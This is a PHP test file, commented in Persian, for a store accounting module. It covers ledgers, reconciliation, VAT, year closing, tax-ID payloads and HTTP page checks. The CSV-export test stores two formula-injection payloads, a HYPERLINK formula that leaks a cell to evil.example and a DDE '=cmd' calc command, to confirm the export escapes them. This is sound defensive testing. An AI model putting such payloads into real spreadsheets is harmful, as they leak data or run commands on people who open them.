T::same(-BizVat::report($u, BizReports::ALL_FROM, BizReports::ALL_TO)['sum']['sale_tax'], (int)$tb['rows']['2103']['balance'], 'حسابِ مالیاتِ فروش = گزارشِ مالیات');
T::same(-50000, (int)$tb['rows']['3102']['balance'], 'آورده‌ی مالک (آورده‌ی باطل‌شده نیامد)');
T::same(8000, (int)$tb['rows']['3103']['balance'], 'برداشتِ مالک');
$bs = BizLedger::balanceSheet($u, BizReports::ALL_TO, $all);
T::same($cashBal($u, $chq), (int)$tb['rows']['1102']['balance'], '⛔ چکِ در جریان در «اسنادِ دریافتنی» است، نه صندوق');
T::same($cashBal($u, $chq), $bs['asset']['اسنادِ دریافتنی (چکِ در جریان)'], 'و در ترازنامه');
T::same(0, $bs['diff'], '⛔ ترازنامه: دارایی = بدهی + سرمایه');
T::same(-$partyBal($u, $SUPP), $bs['liability']['بستانکاران (بدهی به طرف‌حساب‌ها)'], 'بستانکاران = بدهی به تأمین‌کننده (با مانده‌ی اول دوره)');
T::same($partyBal($u, $CUST), $bs['asset']['بدهکاران (طلب از طرف‌حساب‌ها)'], 'بدهکاران = طلب از مشتری');
T::same($cashBal($u, $A), $bs['asset']['صندوق و بانک'], 'صندوق و بانک = موجودیِ صندوق (با مانده‌ی اول دوره)');
$rec = BizLedger::reconcile($u, $tb);
T::ok($rec['ok'], '⛔ مانده‌ی هر صندوق و هر طرف‌حساب در دفتر = عددِ صفحه‌های فروشگاه', json_encode($rec, JSON_UNESCAPED_UNICODE));
T::ok(abs($rec['stock']['diff']) <= 5, 'ارزشِ انبارِ دفتر با ارزشِ میانگینِ کالاها (فقط گردِ چند تومانی)', json_encode($rec['stock']));
// مغایرت واقعاً گرفته می‌شود: مانده‌ی صندوق را پشتِ سرِ دفتر عوض کن
$pdo->prepare('UPDATE biz_payments SET account_id = :c WHERE id = :p AND user_id = :u')->execute(['c' => $chq, 'p' => (int)$sp['id'], 'u' => $u]);
$pdo->prepare('UPDATE biz_parties SET opening_balance = opening_balance + 1 WHERE id = :p AND user_id = :u')->execute(['p' => $CUST, 'u' => $u]);
$tb2 = BizLedger::trial($u, BizReports::ALL_TO);
$bad = BizLedger::reconcile($u, $tb2);
T::ok($bad['ok'], 'جابه‌جاییِ صندوقِ یک سند به هر دو سو می‌رسد (دفتر مشتق است)');
// ⛔ مغایرت‌گیری واقعاً می‌گیرد — دفترِ خراب‌شده (پشتِ سرِ برنامه) در فروشگاهِ جدا
$z = $make('z');
$ZA = $acc($z);
BizProducts::save($z, ['type' => 'goods', 'name' => 'کالای خراب', 'unit' => 'عدد', 'buy_price' => '10', 'sell_price' => '20', 'opening_qty' => '5']);
$zs = $doc($z, 'sale', [$L('کالای خراب', '1', '20')]);
$zok = BizLedger::reconcile($z);
T::ok($zok['ok'] && BizLedger::balanced(BizLedger::entries($z, BizReports::ALL_TO)), 'فروشگاهِ سالم: بی‌مغایرت و تراز');
$pdo->prepare("UPDATE biz_payments SET status = 'void' WHERE invoice_id = :i AND user_id = :u")->execute(['i' => $zs, 'u' => $z]);
$zr = BizLedger::reconcile($z);
T::ok(!$zr['ok'] && in_array('گذری', array_column($zr['parties'], 'name'), true), '⛔ فاکتورِ گذریِ بی‌دریافت (مانده‌ی گذری ≠ صفر) گرفته می‌شود');
$pdo->prepare("INSERT INTO biz_payments (user_id, kind, number, account_id, amount, pay_date) VALUES (:u, 'bogus', 1, :a, 55, CURDATE())")->execute(['u' => $z, 'a' => $ZA]);
$zr = BizLedger::reconcile($z);
T::ok(count($zr['cash']) === 1 && $zr['cash'][0]['ledger'] - $zr['cash'][0]['book'] === 55, '⛔ سندِ ناشناخته‌ای که فقط موجودیِ صندوق را تکان داده گرفته می‌شود');
$pdo->prepare('UPDATE biz_invoice_lines SET net_total = net_total + 1 WHERE invoice_id = :i AND user_id = :u')->execute(['i' => $zs, 'u' => $z]);
T::ok(!BizLedger::balanced(BizLedger::entries($z, BizReports::ALL_TO)), '⛔ سندی که ردیف‌هایش با جمعش نمی‌خواند «ناتراز» دیده می‌شود');

$csv = BizLedger::csv($all);
T::ok(str_starts_with($csv, "\xEF\xBB\xBF") && substr_count($csv, "\n") > count($all), 'CSVِ روزنامه با BOM و یک سطر برای هر ردیف');
$jr = BizLedger::entries($u, date('Y-m-d'), date('Y-m-d'));
T::ok(!array_filter($jr, fn($e) => $e['date'] !== date('Y-m-d')), 'روزنامه‌ی یک بازه فقط سندهای همان بازه');
T::same([], BizLedger::entries($v, BizReports::ALL_TO), '⛔ دفترِ فروشگاهِ دیگر هیچ سطری از این فروشگاه ندارد');

// =================================================================
T::group('۳ب — بازبینیِ مهر ۱۴۰۵: مغایرتِ تاریخ‌دار، فرمول در CSV، نوع‌های پول');
// ⛔ مغایرت‌گیری همیشه کلِ دفتر را می‌سنجد: ترازِ «تا دیروز» (یا امروز، کنارِ
//    دریافتِ تاریخِ آینده) با مانده‌ی امروزِ صفحه‌ها مغایرتِ دروغ نشان می‌داد
$q = $make('q');
$QA = $acc($q);
$QC = (int)BizParties::save($q, ['name' => '=HYPERLINK("http://evil.example/?x="&A1,"x")', 'kind' => 'customer'])['id'];
BizPay::create($q, ['kind' => 'receipt', 'party_id' => $QC, 'amount' => '1000', 'account_id' => $QA, 'pay_date' => date('Y-m-d')]);
$yday = date('Y-m-d', strtotime('-1 day'));
$rq = BizLedger::reconcile($q, BizLedger::trial($q, $yday, '', BizLedger::entries($q, $yday)));
T::ok($rq['ok'], '⛔ ترازنامه‌ی دیروز: بی‌مغایرتِ دروغ', json_encode($rq, JSON_UNESCAPED_UNICODE));
BizPay::create($q, ['kind' => 'receipt', 'party_id' => $QC, 'amount' => '500', 'account_id' => $QA, 'pay_date' => date('Y-m-d', strtotime('+10 day'))]);
$rq = BizLedger::reconcile($q, BizLedger::trial($q, date('Y-m-d')));
T::ok($rq['ok'], '⛔ ترازنامه‌ی امروز با دریافتِ تاریخِ آینده: بی‌مغایرتِ دروغ', json_encode($rq, JSON_UNESCAPED_UNICODE));
$qAll = BizLedger::entries($q, BizReports::ALL_TO);
T::same(BizLedger::entries($q, date('Y-m-d')), BizLedger::upTo($qAll, date('Y-m-d')), '`upTo()` همان سندهای «تا آن روز» است (صفحه یک بار می‌سازد)');
// ⛔ CSVِ روزنامه: نامِ طرف‌حساب و شرحِ هزینه متنِ کاربرند — فرمول در اکسل اجرا نشود
BizPay::create($q, ['kind' => 'expense', 'title' => "=cmd|' /C calc'!A0", 'amount' => '10', 'account_id' => $QA, 'pay_date' => date('Y-m-d')]);
$qcsv = BizLedger::csv(BizLedger::entries($q, BizReports::ALL_TO));
$cells = [];
foreach (array_slice(explode("\n", trim($qcsv)), 1) as $ln) { foreach (str_getcsv($ln, ',', '"', '') as $c) { $cells[] = $c; } }
T::same([], array_values(array_filter($cells, fn($c) => $c !== '' && strpbrk($c[0], '=+@') !== false)), '⛔ هیچ سلولی با = + @ شروع نمی‌شود (فرمولِ تزریقی)');
T::ok(in_array("'=HYPERLINK(\"http://evil.example/?x=\"&A1,\"x\")", $cells, true), 'نامِ طرف‌حساب با «\'» متن ماند، نه حذف', mb_substr($qcsv, 0, 400));
T::ok(in_array('1000', $cells, true), 'مبلغ عددِ خام می‌ماند (بی‌«\'»)');
// ⛔ هر نوعِ دریافت/پرداخت دقیقاً در یکی از «پول می‌آید»، «پول می‌رود» یا انتقال
$kinds = array_merge(BizPay::IN_KINDS, BizPay::OUT_KINDS, ['transfer']);
sort($kinds);
$all7 = array_keys(BizPay::KINDS);
sort($all7);
T::same($all7, $kinds, '⛔ `IN_KINDS` + `OUT_KINDS` + انتقال = همه‌ی نوع‌ها، بی‌تکرار');
// ⛔ و مانده‌ی صندوق، مانده‌ی تاریخ‌دار (شمارش) و جمعِ فهرست همه از همان دو فهرست
$capQ = BizPay::create($q, ['kind' => 'capital', 'amount' => '70', 'account_id' => $QA, 'pay_date' => $yday]);
T::ok($capQ['ok'], 'آورده‌ی دیروز', $capQ['message']);
BizPay::create($q, ['kind' => 'drawing', 'amount' => '5', 'account_id' => $QA, 'pay_date' => date('Y-m-d')]);
$book = (int)array_column(BizCash::list($q), 'balance', 'id')[$QA];
T::same(1000 + 500 - 10 + 70 - 5, $book, 'موجودیِ صندوق (`balanceSql()`)');
T::same($book, BizCashCount::balanceAt($pdo, $q, $QA, BizReports::ALL_TO), '⛔ مانده‌ی تاریخ‌دار همان سازنده است');
T::same(70, BizCashCount::balanceAt($pdo, $q, $QA, $yday), 'مانده‌ی تا دیروز فقط آورده‌ی دیروز');
$ql = BizPay::list($q);
T::same([1570, 15], [$ql['in'], $ql['out']], 'جمعِ ورود و خروجِ فهرست از همان دو فهرست');

// =================================================================
T::group('۶ — بستنِ سالِ مالی');
$w = $make('y');
$WA = $acc($w);
$WP = (int)BizProducts::save($w, ['type' => 'goods', 'name' => 'کالای سال', 'unit' => 'عدد', 'buy_price' => '100', 'sell_price' => '150'])['id'];
[$jy] = BizVat::jym(date('Y-m-d'));
[$pf, $pt] = BizVat::year($jy - 1);
$mid = date('Y-m-d', strtotime($pf . ' +60 day'));
T::ok(is_int($doc($w, 'purchase', [$L('کالای سال', '5', '100')], ['inv_date' => $mid])), 'خریدِ سالِ قبل');
T::ok(is_int($doc($w, 'sale', [$L('کالای سال', '2', '150')], ['inv_date' => $mid])), 'فروشِ سالِ قبل');
BizPay::create($w, ['kind' => 'expense', 'amount' => '20', 'account_id' => $WA, 'title' => 'قبض', 'pay_date' => $mid]);
T::same([$pf, $pt], BizReports::range('last_year'), 'بازه‌ی «سالِ مالیِ قبل» همان سالِ شمسیِ گذشته');
$r = BizYear::close($w, $jy);
T::ok(!$r['ok'] && str_contains($r['message'], 'تمام نشده'), '⛔ سالِ جاری (تمام‌نشده) بسته نمی‌شود', $r['message']);
$r = BizYear::close($w, $jy - 1);
T::ok($r['ok'], 'سالِ قبل بسته شد', $r['message']);
T::same($pt, Biz::lockDate($w), '⛔ دوره تا پایانِ سال قفل شد');
T::ok(!is_int($doc($w, 'sale', [$L('کالای سال', '1', '150')], ['inv_date' => $mid])), '⛔ سندِ تازه در سالِ بسته ثبت نمی‌شود');
$cl = BizYear::closes($w);
T::same(2 * 50 - 20, (int)$cl[0]['profit'], 'سودِ سال: (۱۵۰−۱۰۰)×۲ − ۲۰');
T::same(0, BizLedger::balanceSheet($w, $pt)['diff'], 'ترازنامه‌ی پایانِ سال تراز');
T::ok(isset($cl[0]['snapshot']['trial'], $cl[0]['snapshot']['balance']), 'عکسِ تراز و ترازنامه نگه داشته شد');
T::ok(!BizYear::close($w, $jy - 1)['ok'], 'بستنِ دوباره رد می‌شود');
$bsNow = BizLedger::balanceSheet($w, date('Y-m-d'));
T::same(80, $bsNow['equity']['سود و زیانِ سال‌های قبل'], '⛔ ترازنامه‌ی امسال سودِ پارسال را «سال‌های قبل» نشان می‌دهد');
T::same(0, $bsNow['equity']['سود و زیانِ سالِ جاری'], 'و سودِ امسال جداست');
T::ok(!BizYear::reopen($w, $jy - 1, false)['ok'], 'بازگشایی بی‌تأیید رد می‌شود');
$r = BizYear::reopen($w, $jy - 1, true);
T::ok($r['ok'], 'بازگشایی', $r['message']);
T::same(date('Y-m-d', strtotime($pf . ' -1 day')), Biz::lockDate($w), 'قفل به پیش از آن سال برگشت');
T::same([], BizYear::closes($w), 'عکس پاک شد');
T::ok(is_int($doc($w, 'sale', [$L('کالای سال', '1', '150')], ['inv_date' => $mid])), 'سال دوباره باز است');

// =================================================================
T::group('۲ — سامانه‌ی مودیان: شماره‌ی مالیاتی و صورتحساب');
T::same(3, BizMoadian::verhoeff('236'), 'Verhoeff: ۲۳۶ ← ۳');
T::same(1, BizMoadian::verhoeff('12345'), 'Verhoeff: ۱۲۳۴۵ ← ۱');
$tid = BizMoadian::taxId('A1B2C3', '2026-10-03', 255);
T::same(22, strlen($tid), 'شماره‌ی مالیاتی ۲۲ نویسه');
T::same('A1B2C3', substr($tid, 0, 6), 'با شناسه‌ی حافظه شروع می‌شود');
T::same(str_pad(dechex(intdiv((int)strtotime('2026-10-03 UTC'), 86400)), 5, '0', STR_PAD_LEFT), strtolower(substr($tid, 6, 5)), 'روز از ۱۹۷۰ به هگز');
T::same('00000000ff', strtolower(substr($tid, 11, 10)), 'سریال به هگز');
T::same((string)BizMoadian::verhoeff('65' . '1' . '66' . '2' . '67' . '3' . str_pad((string)intdiv((int)strtotime('2026-10-03 UTC'), 86400), 6, '0', STR_PAD_LEFT) . '000000000255'),
        substr($tid, 21, 1), '⛔ رقمِ کنترل روی شناسه‌ی دهدهی (حرف = کدِ ASCII) + روز + سریال');
$p = BizMoadian::payload($u, $S2);
T::ok($p['ok'], 'صورتحسابِ فاکتورِ فروش', $p['message'] ?? '');
$s2n = $inv($u, $S2);
T::same((int)$s2n['total'] * 10, $p['invoice']['header']['tbill'], '⛔ مبلغ‌ها به ریال: جمعِ کل');
T::same((int)$s2n['tax_total'] * 10, $p['invoice']['header']['tvam'], 'جمعِ مالیات به ریال');
T::same(10.0, $p['invoice']['body'][0]['vra'], 'نرخِ مالیاتِ قلم');
T::same(1, $p['invoice']['header']['setm'], 'روشِ تسویه: نقد (کامل دریافت شده)');
T::ok((bool)array_filter($p['problems'], fn($x) => str_contains($x, 'حافظه')), 'بی‌شناسه‌ی حافظه: ایراد گفته می‌شود');
Biz::forgetSettings($u);
Biz::saveAccounting($u, ['vat_rate' => '10', 'moadian_memory_id' => 'a1b2c3', 'moadian_sstid' => '2720000000001']);
Biz::forgetSettings($u);
Biz::saveSettings($u, ['shop_name' => 'فروشگاهِ آزمون', 'economic_code' => '411111111111']);
Biz::forgetSettings($u);
$p = BizMoadian::payload($u, $S2);
T::same([], $p['problems'], 'با شناسه‌ی حافظه، کدِ اقتصادی و شناسه‌ی کالا: بی‌ایراد');
T::same(BizMoadian::taxId('A1B2C3', (string)$s2n['inv_date'], $S2), $p['invoice']['header']['taxid'], 'شماره‌ی مالیاتیِ سند');
T::same('2720000000001', $p['invoice']['body'][0]['sstid'], 'شناسه‌ی کالا: پیش‌فرضِ فروشگاه');
BizProducts::saveTax($u, $TAX, ['tax_code' => '2720000000099']);
T::same('2720000000099', BizMoadian::payload($u, $S2)['invoice']['body'][0]['sstid'], 'شناسه‌ی خودِ کالا بر پیش‌فرض مقدم است');
T::ok(!BizProducts::saveTax($u, $TAX, ['tax_code' => '12'])['ok'], 'شناسه‌ی کالای کوتاه رد می‌شود');
T::ok(!Biz::saveAccounting($u, ['vat_rate' => '10', 'moadian_memory_id' => 'ABC'])['ok'], 'شناسه‌ی حافظه‌ی کوتاه رد می‌شود');
Biz::forgetSettings($u);
$rp = BizMoadian::payload($u, (int)$r2b['id']);
T::same(4, $rp['invoice']['header']['ins'], 'برگشت از فروش: موضوعِ ۴');
T::same(BizMoadian::taxId('A1B2C3', (string)$o3['inv_date'], $S3), $rp['invoice']['header']['irtaxid'], '⛔ برگشت به شماره‌ی مالیاتیِ فاکتورِ اصلی ارجاع می‌دهد');
T::ok(!BizMoadian::payload($u, $P1)['ok'], 'فاکتورِ خرید صورتحسابِ فروش نیست');
T::ok(!BizMoadian::payload($v, $S2)['ok'], '⛔ فاکتورِ فروشگاهِ دیگر');
T::ok(count(BizMoadian::list($u, BizReports::ALL_FROM, BizReports::ALL_TO)) >= 4, 'فهرستِ فاکتورهای قابلِ ارسال');


// =================================================================
T::group('۱۰ — صفحه‌ها و خروجی‌ها از راهِ HTTP (رندرِ کامل، فرم‌های واقعی)');
$root = dirname(__DIR__);
$port = 0;
for ($pp = 9471; $pp <= 9520; $pp++) {
    $sock = @stream_socket_server("tcp://127.0.0.1:$pp", $e1, $e2);
    if ($sock) { fclose($sock); $port = $pp; break; }
}
$slog = tempnam(sys_get_temp_dir(), 'bacc');
$srv = $port ? (int)trim((string)shell_exec(sprintf('php -S 127.0.0.1:%d -t %s > %s 2>&1 & echo $!',
    $port, escapeshellarg($root), escapeshellarg($slog)))) : 0;
$up = false;
for ($i = 0; $srv && $i < 40; $i++) {
    usleep(150000);
    $sk = @fsockopen('127.0.0.1', $port, $x, $y, 0.3);
    if ($sk) { fclose($sk); $up = true; break; }
}
if (!$up) {
    T::blocked('صفحه‌های حسابداری (HTTP)', 'سرورِ آزمایشی بالا نیامد');
} else {
    $jar = tempnam(sys_get_temp_dir(), 'baccjar');
    $req = function (string $path, ?array $post = null) use ($port, $jar): array {
        $ch = curl_init("http://127.0.0.1:{$port}/{$path}");
        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_COOKIEJAR => $jar, CURLOPT_COOKIEFILE => $jar,
            CURLOPT_FOLLOWLOCATION => false, CURLOPT_HEADER => true, CURLOPT_TIMEOUT => 40]);
        if ($post !== null) { curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); }
        $raw = (string)curl_exec($ch);
        $hlen = (int)curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        unset($ch);
        $loc = preg_match('/^Location:\s*(\S+)/mi', substr($raw, 0, $hlen), $m) ? $m[1] : '';
        return [$code, substr($raw, $hlen), $loc, substr($raw, 0, $hlen)];
    };
    $field = fn(string $html, string $name): string
        => preg_match('/name="' . preg_quote($name, '/') . '"[^>]*value="([^"]+)"/', $html, $m) ? $m[1] : '';
    [, $lp] = $req('store/login.php');
    [$c] = $req('store/login.php', ['csrf_token' => $field($lp, 'csrf_token'), 'username' => APREFIX . 'a', 'password' => APASS]);
    T::ok($c === 302, 'ورود به فروشگاه', (string)$c);

    $pages = [
        'store/accounting.php'                   => 'ترازنامه تراز است',
        'store/accounting.php?t=trial&p=all'     => '✓ تراز',
        'store/accounting.php?t=journal&p=all'   => 'افتتاحیه',
        'store/accounting.php?t=vat&jy=1405&q=0' => 'بدهی به سازمان',
        'store/accounting.php?t=year'            => 'بستنِ سال',
        'store/accounting.php?t=moadian&p=all'   => '✓ <span class="ltr-num">A1B2C3</span>',
        'store/accounting.php?t=cats'            => 'حقوق و دستمزد',
        'store/cash-count.php'                   => 'شمارش‌های اخیر',
        'store/payroll.php'                      => 'کارمندِ آزمون',
        'store/invoice.php?id=' . $S2            => 'سرگذشتِ سند',
        'store/payment.php?id=' . $CAP           => 'سرگذشتِ سند',
        'store/invoice-edit.php?k=sale'          => 'name="vat_rate" value="10"',
        'store/quick-sale.php'                   => 'data-vat-rate',
        'store/payment.php?k=expense'            => 'name="category_id"',
        'store/payment.php?k=capital'            => 'سود را تغییر نمی‌دهد',
        'store/product.php?id=' . $EXM           => 'name="vat_exempt" value="1" checked',
        'store/settings.php'                     => 'name="moadian_memory_id" value="A1B2C3"',
        'store/print.php?doc=invoice&id=' . $S2  => 'مالیات بر ارزش افزوده (۱۰٪)',
    ];
    foreach ($pages as $path => $mark) {
        [$c, $body] = $req($path);
        T::ok($c === 200 && str_contains($body, '</html>') && str_contains($body, $mark), "«{$path}» کامل رندر شد و «" . mb_substr(strip_tags($mark), 0, 30) . '» دارد',
              $c . ' ' . mb_substr(strip_tags($body), 0, 300));
    }
    [$c, $csv, , $hd] = $req('store/accounting.php?t=journal&p=all&csv=1');
    T::ok($c === 200 && str_contains($hd, 'text/csv') && str_starts_with($csv, "\xEF\xBB\xBF") && str_contains($csv, 'بدهکار'), 'CSVِ روزنامه دانلود می‌شود');
    [$c, $js] = $req('store/accounting.php?t=moadian&p=all&json=' . $S2);
    $j = json_decode($js, true);
    T::same(BizMoadian::taxId('A1B2C3', (string)$s2n['inv_date'], $S2), $j['header']['taxid'] ?? null, 'JSONِ یک صورتحساب');
    [$c, $js] = $req('store/accounting.php?t=moadian&p=all&json=all');
    T::ok(count((array)json_decode($js, true)) >= 4, 'JSONِ همه‌ی صورتحساب‌های بازه');
    [$c, , $loc] = $req('store/accounting.php?t=moadian&p=all&json=' . $P1);
    T::ok($c === 302, 'فاکتورِ خرید خروجیِ مودیان ندارد', (string)$c);

    // فرم‌ها
    [, $cc] = $req('store/cash-count.php');
    $nCounts = count(BizCashCount::history($u));
    [$c] = $req('store/cash-count.php', ['csrf_token' => $field($cc, 'csrf_token'), '_once' => $field($cc, '_once'),
        'account_id' => (string)$A, 'counted' => (string)$cashBal($u, $A), 'date' => BizDocView::jDate(date('Y-m-d')), 'note' => '']);
    T::ok($c === 302 && count(BizCashCount::history($u)) === $nCounts + 1, 'شمارشِ صندوق از فرم ثبت شد');
    [, $pr] = $req('store/payroll.php');
    $eb = $partyBal($u, $EMP);
    [$c] = $req('store/payroll.php', ['csrf_token' => $field($pr, 'csrf_token'), '_once' => $field($pr, '_once'), 'action' => 'advance',
        'emp' => (string)$EMP, 'amount' => '250', 'account_id' => (string)$A, 'date' => BizDocView::jDate(date('Y-m-d')), 'note' => '']);
    T::same($eb + 250, $partyBal($u, $EMP), 'مساعده از فرم');
    [, $ac] = $req('store/accounting.php?t=cats');
    [$c] = $req('store/accounting.php?t=cats', ['csrf_token' => $field($ac, 'csrf_token'), 'action' => 'cat_save', 'kind' => 'expense', 'name' => 'اینترنت']);
    T::ok($c === 302 && in_array('اینترنت', array_column(BizExpCats::list($u, 'expense'), 'name'), true), 'سرفصلِ تازه از فرم');
    [, $pe] = $req('store/payment.php?k=expense');
    $net = (int)array_values(array_filter(BizExpCats::list($u, 'expense'), fn($c) => $c['name'] === 'اینترنت'))[0]['id'];
    [$c, , $loc] = $req('store/payment.php?k=expense', ['csrf_token' => $field($pe, 'csrf_token'), '_once' => $field($pe, '_once'),
        'amount' => '90', 'account_id' => (string)$A, 'method' => 'cash', 'pay_date' => BizDocView::jDate(date('Y-m-d')),
        'title' => '', 'note' => '', 'category_id' => (string)$net, 'party_id' => '0', 'to_account_id' => '0',
        'cheque_no' => '', 'cheque_bank' => '', 'cheque_due' => '']);
    $np = BizPay::get($u, (int)preg_replace('/\D/', '', (string)strstr($loc, 'id=')));
    T::same([$net, 'اینترنت'], [(int)($np['category_id'] ?? 0), (string)($np['title'] ?? '')], 'هزینه با سرفصل از فرم (شرحِ خالی = نامِ سرفصل)');
    // فرمِ فاکتور: ردیفِ کالای معاف پس از بازسازیِ فرم نشانش را دارد؛ نرخِ دستیِ سند ذخیره می‌شود
    [, $ie] = $req('store/invoice-edit.php?k=sale');
    $iePost = ['csrf_token' => $field($ie, 'csrf_token'), '_once' => $field($ie, '_once'), 'party_id' => (string)$CUST,
               'inv_date' => BizDocView::jDate(date('Y-m-d')), 'discount' => '', 'extra' => '', 'note' => '', 'vat_rate' => '0',
               'lines' => [['item' => 'کالای معاف', 'qty' => '1', 'price' => '800'], ['item' => 'کالای مشمول', 'qty' => '1', 'price' => '2000']],
               'pay_mode' => 'none', 'account_id' => (string)$A, 'method' => 'cash'];
    [$c, $body] = $req('store/invoice-edit.php?k=sale', $iePost + ['action' => 'addrows']);
    T::ok(preg_match('/<tr class="st-line" data-row data-vex="1">(?:(?!<\/tr>).)*کالای معاف/su', $body) === 1, '⛔ ردیفِ کالای معاف در فرمِ بازسازی‌شده نشانِ معافیت دارد (جمعِ زنده)');
    [$c, , $loc] = $req('store/invoice-edit.php?k=sale', $iePost + ['action' => 'save']);
    $dId = (int)preg_replace('/\D/', '', (string)strstr($loc, 'id='));
    T::same([0, 0.0], [(int)($inv($u, $dId)['tax_total'] ?? -1), (float)($inv($u, $dId)['vat_rate'] ?? -1)], '⛔ نرخِ «۰»ِ فرم روی سند نشست (نه نرخِ فروشگاه)');
    BizInvoices::deleteDraft($u, $dId);
    [$c, $body] = $req('store/accounting.php?t=year');
    T::ok(!str_contains($body, 'action" value="year_close"><input type="hidden" name="jy" value="' . $jy), 'سالِ جاری دکمه‌ی بستن ندارد');

    $log2 = (string)@file_get_contents($slog);
    T::ok(!preg_match('/PHP (Fatal|Warning|Notice|Deprecated)/', $log2), 'لاگِ سرور بی‌هشدار و بی‌خطا', mb_substr($log2, 0, 600));
    posix_kill($srv, SIGTERM);
    @unlink($jar);
}
@unlink($slog);

$wipe();
exit(T::report());
